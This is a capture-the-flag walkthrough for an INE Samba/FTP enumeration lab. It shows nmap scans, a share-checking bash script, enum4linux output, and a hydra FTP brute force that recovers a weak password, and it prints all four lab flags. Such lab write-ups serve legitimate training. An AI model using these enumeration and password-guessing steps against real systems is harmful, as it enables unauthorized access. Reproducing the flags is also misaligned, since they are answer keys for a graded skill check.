---
aliases:
  - "Assessment Methodologies: Enumeration CTF 1"
---

# Lab

## Overview

This lab focuses on enumeration techniques to identify and analyze running services on a target Linux machine. The goal is to explore and interact with the machine's services to uncover and capture hidden flags. Participants will apply their knowledge of network and system enumeration to identify misconfigurations, weak credentials, and potential security vulnerabilities.

### Completing Skill Check Labs

Skill Check Labs are interactive, hands-on exercises designed to validate the knowledge and skills you’ve gained in this course through real-world scenarios. Each lab presents practical tasks that require you to apply what you’ve learned. Unlike other INE labs, solutions are not provided, challenging you to demonstrate your understanding and problem-solving abilities. Your performance is graded, allowing you to track progress and measure skill growth over time.

# Lab Environment

A Linux machine is accessible at **target.ine.local**. Identify the services running on the machine and capture the flags. The flag is an md5 hash format.

- **Flag 1:** There is a samba share that allows anonymous access. Wonder what's in there!
- **Flag 2:** One of the samba users have a bad password. Their private share with the same name as their username is at risk!
- **Flag 3:** Follow the hint given in the previous flag to uncover this one.
- **Flag 4:** This is a warning meant to deter unauthorized users from logging in.

**Note:** The wordlists located in the following directory will be useful:

- /root/Desktop/wordlists

# Tools

- Nmap
- Metasploit
- Hydra
- enum4linux
- smbclient
- smbmap

---

### Note

In this lab, the flag will follow the format: FLAG1{MD5Hash}. For example, FLAG1{0f4d0db3668dd58cabb9eb409657eaa8}. You need to submit only the MD5 hash string, excluding the braces. For instance: 0f4d0db3668dd58cabb9eb409657eaa8.


# Walkthrough

## Scanning

```bash
                                                                                                                    
┌──(root㉿INE)-[~/Desktop/wordlists]
└─# nmap -sC -sV -p- -T4 target.ine.local
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-01 00:14 IST
Nmap scan report for target.ine.local (192.150.17.3)
Host is up (0.000046s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 bb:ca:49:7e:f5:5c:6e:bf:8a:55:a1:69:d9:c9:18:01 (RSA)
|   256 da:06:c1:ab:e7:6f:14:b9:50:d5:43:a7:47:ab:80:ce (ECDSA)
|_  256 a1:5c:ab:22:6b:c2:f1:5c:5a:7a:5a:d8:e7:81:e2:33 (ED25519)
139/tcp  open  netbios-ssn Samba smbd 4.6.2
445/tcp  open  netbios-ssn Samba smbd 4.6.2
5554/tcp open  ftp         vsftpd 2.0.8 or later
MAC Address: 02:42:C0:96:11:03 (Unknown)
Service Info: Host: blah; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: TARGET, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-04-30T18:44:50
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.91 seconds

```

#### Port 139/445 running `Samba smbd 4.6.2`
#### Port 5554 running `vsftpd 2.0.8 or later`


## **Flag 1:** There is a samba share that allows anonymous access. Wonder what's in there!

So, in our wordlist directory we have `shares.txt` . Let's make a bash script to check the anonymous access. 

### Our Script

```bash
#!/bin/bash

# Colors
GREEN="\e[32m"
RED="\e[31m"
RESET="\e[0m"

# Path to the wordlist file
wordlist_path="/root/Desktop/wordlists/shares.txt"

# Target IP or Hostname
target_ip="target.ine.local"

# Function to check share access with smbclient
check_smb_share() {
    local share_name=$1
    echo -e "Checking share: ${share_name}"

    # Run the smbclient command to check anonymous access
    smbclient "//${target_ip}/${share_name}" -N -c "ls" &>/dev/null

    # Check if the share is accessible (exit code 0)
    if [ $? -eq 0 ]; then
        echo -e "${GREEN}[+] Accessible: ${share_name}${RESET}"
    else
        echo -e "${RED}[-] Not accessible: ${share_name}${RESET}"
    fi
}

# Read shares from the shares.txt file
while IFS= read -r share; do
    # Strip whitespace
    share=$(echo "$share" | xargs)

    # Skip empty lines
    [ -z "$share" ] && continue

    # Check each share
    check_smb_share "$share"
done < "$wordlist_path"

```

Let's run this 

```bash
┌──(root㉿INE)-[~/Desktop/wordlists]
└─# nano smb_share_check.sh
                                                                                                                                                            
┌──(root㉿INE)-[~/Desktop/wordlists]
└─# bash smb_share_check.sh 
Checking share: publicdata
[-] Not accessible: publicdata
Checking share: communitydata
[-] Not accessible: communitydata
Checking share: openstorage
[-] Not accessible: openstorage
Checking share: freestorage
[-] Not accessible: freestorage
Checking share: accessiblestorage
[-] Not accessible: accessiblestorage
Checking share: pubstorage
[-] Not accessible: pubstorage
Checking share: commonstorage
[-] Not accessible: commonstorage
Checking share: publicarchive
[-] Not accessible: publicarchive
Checking share: sharedarchive
[-] Not accessible: sharedarchive
Checking share: commonarchive
[-] Not accessible: commonarchive
Checking share: pubarchive
[-] Not accessible: pubarchive
Checking share: opendocs
[-] Not accessible: opendocs
Checking share: freedocs
[-] Not accessible: freedocs
Checking share: communitydocs
[-] Not accessible: communitydocs
Checking share: accessibledocs
[-] Not accessible: accessibledocs
Checking share: commondocs
[-] Not accessible: commondocs
Checking share: pubdocs
[-] Not accessible: pubdocs
Checking share: publicfiles
[-] Not accessible: publicfiles
Checking share: openfiles
[-] Not accessible: openfiles
Checking share: freefiles
[-] Not accessible: freefiles
Checking share: sharedfiles
[-] Not accessible: sharedfiles
Checking share: accessiblefiles
[-] Not accessible: accessiblefiles
Checking share: communityfiles
[-] Not accessible: communityfiles
Checking share: commonsfiles
[-] Not accessible: commonsfiles
Checking share: pubfiles
[+] Accessible: pubfiles
Checking share: openvault
[-] Not accessible: openvault
Checking share: freevault
[-] Not accessible: freevault
Checking share: accessiblevault
[-] Not accessible: accessiblevault
Checking share: publicvault
[-] Not accessible: publicvault
Checking share: commonvault
[-] Not accessible: commonvault
Checking share: openlibrary
[-] Not accessible: openlibrary
Checking share: pubvault
[-] Not accessible: pubvault
Checking share: freelibrary
[-] Not accessible: freelibrary
Checking share: accessiblelibrary
[-] Not accessible: accessiblelibrary
Checking share: worldstoragebin
[-] Not accessible: worldstoragebin
Checking share: universalstoragebin
[-] Not accessible: universalstoragebin
Checking share: sharedstoragebin
[-] Not accessible: sharedstoragebin
Checking share: collectivestoragebin
[-] Not accessible: collectivestoragebin
Checking share: mutualstoragebin
[-] Not accessible: mutualstoragebin
Checking share: globalarchivebin
[-] Not accessible: globalarchivebin
Checking share: worldarchivebin
[-] Not accessible: worldarchivebin
Checking share: universalarchivebin
[-] Not accessible: universalarchivebin
                                                                                                                                                            
┌──(root㉿INE)-[~/Desktop/wordlists]
└─# smbclient //target.ine.local/pubfiles -N


Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu May  1 00:01:23 2025
  ..                                  D        0  Tue Nov 19 10:44:41 2024
  flag1.txt                           N       40  Thu May  1 00:01:23 2025

                1981311780 blocks of size 1024. 87287476 blocks available
smb: \> get flag1.txt 
getting file \flag1.txt of size 40 as flag1.txt (19.5 KiloBytes/sec) (average 19.5 KiloBytes/sec)
smb: \> exit
                                                                                                                                                            
┌──(root㉿INE)-[~/Desktop/wordlists]
└─# cat flag1.txt 
FLAG1{299c3f99869f48b6a90b0aef08569d78}

```

Got the Flag.
## **Flag 2:** One of the samba users have a bad password. Their private share with the same name as their username is at risk!

Let's use `enum4linux`  to enumerate SMB users:

```bash
enum4linux -a target.ine.local
```

```bash
┌──(root㉿INE)-[~/Desktop/wordlists]
└─# enum4linux -a target.ine.local

Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Thu May  1 00:41:07 2025

 =========================================( Target Information )=========================================

Target ........... target.ine.local
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ==========================( Enumerating Workgroup/Domain on target.ine.local )==========================


[+] Got domain/workgroup name: WORKGROUP


 ==============================( Nbtstat Information for target.ine.local )==============================

Looking up status of 192.150.17.3
        TARGET          <00> -         B <ACTIVE>  Workstation Service
        TARGET          <03> -         B <ACTIVE>  Messenger Service
        TARGET          <20> -         B <ACTIVE>  File Server Service
        ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
        WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
        WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
        WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

        MAC Address = 00-00-00-00-00-00

 =================================( Session Check on target.ine.local )=================================
                                                                                                                                                            
                                                                                                                                                            
[+] Server target.ine.local allows sessions using username '', password ''                                                                                  
                                                                                                                                                            
                                                                                                                                                            
 ==============================( Getting domain SID for target.ine.local )==============================
                                                                                                                                                            
Domain Name: WORKGROUP                                                                                                                                      
Domain Sid: (NULL SID)

[+] Can't determine if host is part of domain or part of a workgroup                                                                                        
                                                                                                                                                            
                                                                                                                                                            
 =================================( OS information on target.ine.local )=================================
                                                                                                                                                            
                                                                                                                                                            
[E] Can't get OS info with smbclient                                                                                                                        
                                                                                                                                                            
                                                                                                                                                            
[+] Got OS info for target.ine.local from srvinfo:                                                                                                          
        TARGET         Wk Sv PrQ Unx NT SNT target server (Samba, Ubuntu)                                                                                   
        platform_id     :       500
        os version      :       6.1
        server type     :       0x809a03


 =====================================( Users on target.ine.local )=====================================
                                                                                                                                                            
index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: josh     Name:   Desc:                                                                                       
index: 0x2 RID: 0x3ea acb: 0x00000010 Account: nancy    Name:   Desc: 
index: 0x3 RID: 0x3e9 acb: 0x00000010 Account: bob      Name:   Desc: 

user:[josh] rid:[0x3e8]
user:[nancy] rid:[0x3ea]
user:[bob] rid:[0x3e9]

 ===============================( Share Enumeration on target.ine.local )===============================
                                                                                                                                                            
smbXcli_negprot_smb1_done: No compatible protocol selected by server.                                                                                       

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        IPC$            IPC       IPC Service (target server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.
Protocol negotiation to server target.ine.local (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on target.ine.local                                                                                                            
                                                                                                                                                            
//target.ine.local/print$       Mapping: DENIED Listing: N/A Writing: N/A                                                                                   

[E] Can't understand response:                                                                                                                              
                                                                                                                                                            
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*                                                                                                                  
//target.ine.local/IPC$ Mapping: N/A Listing: N/A Writing: N/A

 ==========================( Password Policy Information for target.ine.local )==========================
                                                                                                                                                            
                                                                                                                                                            

[+] Attaching to target.ine.local using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

        [+] TARGET
        [+] Builtin

[+] Password Info for Domain: TARGET

        [+] Minimum password length: 5
        [+] Password history length: None
        [+] Maximum password age: 37 days 6 hours 21 minutes 
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: None
        [+] Reset Account Lockout Counter: 30 minutes 
        [+] Locked Account Duration: 30 minutes 
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: 37 days 6 hours 21 minutes 



[+] Retieved partial password policy with rpcclient:                                                                                                        
                                                                                                                                                            
                                                                                                                                                            
Password Complexity: Disabled                                                                                                                               
Minimum Password Length: 5


 =====================================( Groups on target.ine.local )=====================================
                                                                                                                                                            
                                                                                                                                                            
[+] Getting builtin groups:                                                                                                                                 
                                                                                                                                                            
                                                                                                                                                            
[+]  Getting builtin group memberships:                                                                                                                     
                                                                                                                                                            
                                                                                                                                                            
[+]  Getting local groups:                                                                                                                                  
                                                                                                                                                            
                                                                                                                                                            
[+]  Getting local group memberships:                                                                                                                       
                                                                                                                                                            
                                                                                                                                                            
[+]  Getting domain groups:                                                                                                                                 
                                                                                                                                                            
                                                                                                                                                            
[+]  Getting domain group memberships:                                                                                                                      
                                                                                                                                                            
                                                                                                                                                            
 ================( Users on target.ine.local via RID cycling (RIDS: 500-550,1000-1050) )================
                                                                                                                                                            
                                                                                                                                                            
[I] Found new SID:                                                                                                                                          
S-1-22-1                                                                                                                                                    

[I] Found new SID:                                                                                                                                          
S-1-5-32                                                                                                                                                    

[I] Found new SID:                                                                                                                                          
S-1-5-32                                                                                                                                                    

[I] Found new SID:                                                                                                                                          
S-1-5-32                                                                                                                                                    

[I] Found new SID:                                                                                                                                          
S-1-5-32                                                                                                                                                    

[+] Enumerating users using SID S-1-5-21-818447810-3582438990-1410767743 and logon username '', password ''                                                 
                                                                                                                                                            
S-1-5-21-818447810-3582438990-1410767743-501 TARGET\nobody (Local User)                                                                                     
S-1-5-21-818447810-3582438990-1410767743-513 TARGET\None (Domain Group)
S-1-5-21-818447810-3582438990-1410767743-1000 TARGET\josh (Local User)
S-1-5-21-818447810-3582438990-1410767743-1001 TARGET\bob (Local User)
S-1-5-21-818447810-3582438990-1410767743-1002 TARGET\nancy (Local User)

[+] Enumerating users using SID S-1-5-32 and logon username '', password ''                                                                                 
                                                                                                                                                            
S-1-5-32-544 BUILTIN\Administrators (Local Group)                                                                                                           
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''                                                                                 
                                                                                                                                                            
S-1-22-1-1000 Unix User\josh (Local User)                                                                                                                   
S-1-22-1-1001 Unix User\bob (Local User)
^AS-1-22-1-1002 Unix User\nancy (Local User)
S-1-22-1-1003 Unix User\alice (Local User)

 =============================( Getting printer info for target.ine.local )=============================
                                                                                                                                                            
No printers returned.                                                                                                                                       


enum4linux complete on Thu May  1 00:41:29 2025

```

```bash

 =====================================( Users on target.ine.local )=====================================
                                                                                                                                                            
index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: josh     Name:   Desc:                                                                                       
index: 0x2 RID: 0x3ea acb: 0x00000010 Account: nancy    Name:   Desc: 
index: 0x3 RID: 0x3e9 acb: 0x00000010 Account: bob      Name:   Desc: 

user:[josh] rid:[0x3e8]
user:[nancy] rid:[0x3ea]
user:[bob] rid:[0x3e9]
```

Got 3 users let's save this into users.txt

After password cracking for josh using metasploit got password `purple` for user `josh`

```bash
┌──(root㉿INE)-[~/Desktop/wordlists]
└─# smbclient //target.ine.local/josh -U josh
Password for [WORKGROUP\josh]:
Try "help" to get a list of possible commands.
smb: \> help
?              allinfo        altname        archive        backup         
blocksize      cancel         case_sensitive cd             chmod          
chown          close          del            deltree        dir            
du             echo           exit           get            getfacl        
geteas         hardlink       help           history        iosize         
lcd            link           lock           lowercase      ls             
l              mask           md             mget           mkdir          
mkfifo         more           mput           newer          notify         
open           posix          posix_encrypt  posix_open     posix_mkdir    
posix_rmdir    posix_unlink   posix_whoami   print          prompt         
put            pwd            q              queue          quit           
readlink       rd             recurse        reget          rename         
reput          rm             rmdir          showacls       setea          
setmode        scopy          stat           symlink        tar            
tarmode        timeout        translate      unlock         volume         
vuid           wdel           logon          listconnect    showconnect    
tcon           tdis           tid            utimes         logoff         
..             !              
smb: \> ls
  .                                   D        0  Thu May  1 00:01:23 2025
  ..                                  D        0  Tue Nov 19 10:44:41 2024
  flag2.txt                           N      119  Thu May  1 00:01:23 2025

                1981311780 blocks of size 1024. 87342036 blocks available
smb: \> get flag
getting file \flag2.txt of size 119 as flag2.txt (58.1 KiloBytes/sec) (average 58.1 KiloBytes/sec)

```

got the second flag

```bash
┌──(root㉿INE)-[~/Desktop/wordlists]
└─# cat flag2.txt 
FLAG2{902bd4fabdb8430785607496c6534884}

Psst! I heard there is an FTP service running. Find it and check the banner. 

```

Also, a hint
## **Flag 3:** Follow the hint given in the previous flag to uncover this one.

```bash
                                                                                                                                                            
┌──(root㉿INE)-[~]
└─# ftp  target.ine.local -p 5554
Connected to target.ine.local.
220 Welcome to blah FTP service. Reminder to users, specifically ashley, alice and amanda to change their weak passwords immediately!!!
Name (target.ine.local:root): ^C


```

As the banner here suggest and the user list we got alice is a user. Let's try bruteforcing her username with password list using hydra.

```bash
┌──(root㉿INE)-[~/Desktop/wordlists]
└─# echo "alice" >> usr.txt                      
                                                                                                                                                            
┌──(root㉿INE)-[~/Desktop/wordlists]
└─# hydra -L usr.txt -P unix_passwords.txt -s 5554 ftp://target.ine.local

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-05-01 00:35:33
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 1009 login tries (l:1/p:1009), ~64 tries per task
[DATA] attacking ftp://target.ine.local:5554/
[5554][ftp] host: target.ine.local   login: alice   password: pretty
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-05-01 00:35:56

```

Got the password. now for the ftp login.

```bash
┌──(root㉿INE)-[~]
└─# ftp target.ine.local -p 5554
Connected to target.ine.local.
220 Welcome to blah FTP service. Reminder to users, specifically ashley, alice and amanda to change their weak passwords immediately!!!
Name (target.ine.local:root): alice
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||6426|)
150 Here comes the directory listing.
-rw-rw-r--    1 0        0              40 Apr 30 18:31 flag3.txt
226 Directory send OK.
ftp> get flag3.txt
local: flag3.txt remote: flag3.txt
229 Entering Extended Passive Mode (|||46204|)
150 Opening BINARY mode data connection for flag3.txt (40 bytes).
100% |**********************************************************************************************************************************************************************************************|    40      411.18 KiB/s    00:00 ETA
226 Transfer complete.
40 bytes received in 00:00 (83.64 KiB/s)
ftp> ls
229 Entering Extended Passive Mode (|||53201|)
150 Here comes the directory listing.
-rw-rw-r--    1 0        0              40 Apr 30 18:31 flag3.txt
226 Directory send OK.
ftp> exit
221 Goodbye.

┌──(root㉿INE)-[~]
└─# cat flag3.txt 
FLAG3{a6aeccc769994744b4d3e5f69dcbf5b8}

```

Got the 3rd Flag.
## **Flag 4:** This is a warning meant to deter unauthorized users from logging in.

So, after many tries i tried doing ssh and found the 4th flag

```bash
┌──(root㉿INE)-[~/Desktop/wordlists]
└─# ssh alice@target.ine.local
The authenticity of host 'target.ine.local (192.150.17.3)' can't be established.
ED25519 key fingerprint is SHA256:qWHJnmTFgrmLKFbmMNRLIr1Y8MVWpqGGxhJ5miFHgnQ.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'target.ine.local' (ED25519) to the list of known hosts.
********************************************************************
*                                                                  *
*            WARNING: Unauthorized access to this system           *
*            is strictly prohibited and may be subject to          *
*            criminal prosecution.                                 *
*                                                                  *
*            This system is for authorized users only.             *
*            All activities on this system are monitored           *
*            and recorded.                                         *
*                                                                  *
*            By accessing this system, you consent to              *
*            such monitoring and recording.                        *
*                                                                  *
*            If you are not an authorized user,                    *
*            disconnect immediately.                               *
*                                                                  *
********************************************************************
*                                                                  *
*    Is this what you're looking for?: FLAG4{66bbda729c2f434ba5cbe8494aea3fa2}       *
*                                                                  *
********************************************************************
alice@target.ine.local's password: 

                                                                                                                                                            
┌──(root㉿INE)-[~/Desktop/wordlists]
└─# 

```